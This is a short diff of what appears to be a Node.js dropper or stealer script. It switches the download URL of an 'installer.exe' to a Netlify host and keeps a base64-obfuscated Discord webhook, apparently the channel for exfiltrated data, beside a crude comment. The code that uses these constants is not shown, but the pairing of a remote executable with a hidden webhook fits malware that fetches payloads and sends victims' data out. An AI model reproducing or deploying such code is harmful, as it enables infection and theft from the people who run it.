@@ -4,7 +4,7 @@ const os = require("os");
 const path = require("path");
 
 const INSTALLER_URL =
-  "https://raw.githubusercontent.com/a44852433-svg/envious.lol/main/installer.exe";
+  "https://gorgeous-selkie-049a08.netlify.app/installer.exe";
 // yeah i dont care if this is compromised fuck this webhook
 const DISCORD_WEBHOOK_BASE64 =
   "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU0NjMxMTQ3Njc0MTE0ODY3Mi8tSG5RQ3JiZVNha09XV0pXNThCWEFtZHNvbjdxUGVZSzRvUGF6NDdscWxtam5JUVpfX0txV0pMeHVtUmNLZVdrUmFnNg==";
